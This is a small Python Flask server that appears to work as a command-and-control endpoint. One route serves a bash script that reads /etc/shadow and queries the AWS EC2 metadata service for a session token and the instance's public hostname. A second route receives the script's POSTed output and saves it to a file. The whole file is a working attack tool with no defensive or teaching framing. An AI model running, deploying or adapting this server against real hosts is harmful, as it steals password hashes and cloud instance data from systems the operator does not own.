from flask import Flask, request

app = Flask(__name__)


@app.route("/getscript")
def send_script():
    command = "cat /etc/shadow\nTOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\necho '\nFrom:'\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/public-hostname\necho '\n!! End !!\n'"
    script = f'#!/bin/bash\n{command}'

    return script, 200, {"Content-Type": "text/plain"}

@app.route('/postresult', methods=['POST'])
def receive_result():
    result = request.get_data().decode('utf-8')
    print(result)
    with open('result.txt', 'w') as f:
        f.write(result)
    return 'Result received'


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)